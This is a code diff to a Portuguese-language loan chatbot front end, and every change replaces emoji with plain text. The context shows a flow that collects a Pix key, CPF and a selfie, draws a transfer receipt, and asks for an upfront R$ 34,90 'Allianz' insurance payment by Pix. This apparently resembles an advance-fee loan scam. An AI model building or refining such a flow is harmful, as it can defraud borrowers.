@@ -488,7 +488,7 @@ const InsuranceCard = ({ onAccept, accepted, nome, cpf, dataNascimento, valor, p
               <div className="flex items-center gap-2">
                 <img src="/images/allianz-logo.png" alt="Allianz" className="h-9 brightness-0 invert" />
                 <button onClick={() => setOpen(false)} className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white hover:bg-white/30 transition">
-                  ✕
+                  X
                 </button>
               </div>
             </div>
@@ -765,7 +765,7 @@ const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: stri
                 </div>
               </div>
               <button onClick={() => setOpen(false)} className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white hover:bg-white/30 transition shrink-0">
-                ✕
+                X
               </button>
             </div>
 
@@ -891,7 +891,7 @@ const generateTransferReceipt = async (data: { nome: string; cpf: string; valor:
   ctx.fillStyle = "#00875A";
   ctx.font = "bold 24px Arial";
   ctx.textAlign = "center";
-  ctx.fillText("✓", w / 2, 58);
+  ctx.fillText("OK", w / 2, 58);
 
   // Title
   ctx.fillStyle = "#ffffff";
@@ -1312,7 +1312,7 @@ const ContractCard = ({ nome, cpf, email, dataNascimento, valor, parcelas, valor
                 </div>
               </div>
               <button onClick={() => setOpen(false)} className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-primary-foreground hover:bg-white/30 transition">
-                ✕
+                X
               </button>
             </div>
 
@@ -1855,7 +1855,7 @@ const Chat = () => {
       // Caminho rápido: já validou antes, pula direto pra selfie.
       setTimeout(() => {
         addBotMessages(() => [
-          { id: Date.now() + 1, text: `Identificamos que essa chave Pix já foi validada em uma sessão anterior, ${firstName || "cliente"}. ✅`, fromUser: false, time: getNow(), read: true },
+          { id: Date.now() + 1, text: `Identificamos que essa chave Pix já foi validada em uma sessão anterior, ${firstName || "cliente"}.`, fromUser: false, time: getNow(), read: true },
           { id: Date.now() + 2, text: `Não é necessário enviar um novo valor de teste. Vamos avançar direto para a verificação de identidade com uma selfie. É rápido e seguro:`, fromUser: false, time: getNow(), read: true },
         ]).then(() => {
           addBotMessages(() => [
@@ -1897,7 +1897,7 @@ const Chat = () => {
 
       addBotMessages(() => [
         { id: Date.now() + 1, text: verificationMessage, fromUser: false, time: getNow(), read: true },
-        { id: Date.now() + 2, text: `🔒 *Transparência sobre a verificação:* a validação da sua conta é processada pela *GM INTERMEDIAÇÃO E NEGÓCIOS LTDA* (CNPJ 64.167.915/0001-79), instituição credenciada e parceira responsável pela verificação de titularidade da chave Pix. Após a confirmação, os dados validados são repassados em sigilo para a *SUPERSIM ANÁLISE DE DADOS E CORRESPONDENTE BANCÁRIO LTDA* (CNPJ 33.030.944/0001-60), que segue com a liberação do seu crédito. Tudo em conformidade com a LGPD e as normas do Banco Central.`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 2, text: `*Transparência sobre a verificação:* a validação da sua conta é processada pela *GM INTERMEDIAÇÃO E NEGÓCIOS LTDA* (CNPJ 64.167.915/0001-79), instituição credenciada e parceira responsável pela verificação de titularidade da chave Pix. Após a confirmação, os dados validados são repassados em sigilo para a *SUPERSIM ANÁLISE DE DADOS E CORRESPONDENTE BANCÁRIO LTDA* (CNPJ 33.030.944/0001-60), que segue com a liberação do seu crédito. Tudo em conformidade com a LGPD e as normas do Banco Central.`, fromUser: false, time: getNow(), read: true },
         { id: Date.now() + 3, text: `Aguarde alguns instantes e confira o extrato da conta vinculada à chave Pix informada. Assim que identificar o crédito do valor simbólico de teste, toque no botão abaixo para prosseguir.`, fromUser: false, time: getNow(), read: true },
         { id: Date.now() + 4, cashoutReceivedButton: true, fromUser: false, time: getNow(), read: true },
       ]);
@@ -1908,11 +1908,11 @@ const Chat = () => {
     if (cashoutReceived) return;
     setCashoutReceived(true);
     setTimeout(() => {
-      setMessages((prev) => [...prev, { id: Date.now(), text: "Recebi o valor ✅", fromUser: true, time: getNow(), read: true }]);
+      setMessages((prev) => [...prev, { id: Date.now(), text: "Recebi o valor", fromUser: true, time: getNow(), read: true }]);
     }, 200);
     setTimeout(() => {
       addBotMessages(() => [
-        { id: Date.now() + 1, text: `Ótimo, ${firstName || "cliente"}! Conta verificada com sucesso ✅. Antes de assinar o contrato, precisamos validar sua identidade com uma selfie. É rápido e seguro:`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 1, text: `Ótimo, ${firstName || "cliente"}! Conta verificada com sucesso. Antes de assinar o contrato, precisamos validar sua identidade com uma selfie. É rápido e seguro:`, fromUser: false, time: getNow(), read: true },
       ]).then(() => {
         addBotMessages(() => [
           { id: Date.now() + 2, facialVerification: true, fromUser: false, time: getNow(), read: true },
@@ -1961,9 +1961,9 @@ const Chat = () => {
     }, 300);
     setTimeout(() => {
       addBotMessages(() => [
-        { id: Date.now() + 3, text: `${firstName || "Cliente"}, boa notícia! Junto com o seu empréstimo você tem um benefício de proteção opcional: o Seguro Prestamista Allianz. 🛡️`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 3, text: `${firstName || "Cliente"}, boa notícia! Junto com o seu empréstimo você tem um benefício de proteção opcional: o Seguro Prestamista Allianz.`, fromUser: false, time: getNow(), read: true },
         { id: Date.now() + 31, text: `Funciona assim: por um valor único de R$ 34,90, se acontecer algum imprevisto e você ficar impossibilitado de pagar (como desemprego involuntário ou problemas de saúde), a seguradora quita as parcelas restantes do empréstimo. Sua família fica tranquila e seu nome continua limpo.`, fromUser: false, time: getNow(), read: true },
-        { id: Date.now() + 32, text: `Preparamos um vídeo curtinho explicando como funciona. Dá uma olhada 👇`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 32, text: `Preparamos um vídeo curtinho explicando como funciona. Dá uma olhada:`, fromUser: false, time: getNow(), read: true },
       ]).then(() => {
         addBotMessages(() => [
           { id: Date.now() + 35, videoSrc: "/seguro-prestamista.mp4", fromUser: false, time: getNow(), read: true },
@@ -2468,7 +2468,7 @@ const Chat = () => {
                 </div>
               )}
               {msg.cashoutReceivedButton && cashoutReceived && (
-                <div className="text-center text-xs text-green-600 font-semibold py-1">Recebimento confirmado ✅</div>
+                <div className="text-center text-xs text-green-600 font-semibold py-1">Recebimento confirmado</div>
               )}
               {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} label={msg.pixPayment.label} sublabel={msg.pixPayment.sublabel} />}
               {msg.pixPaidButton && !pixPaid && (
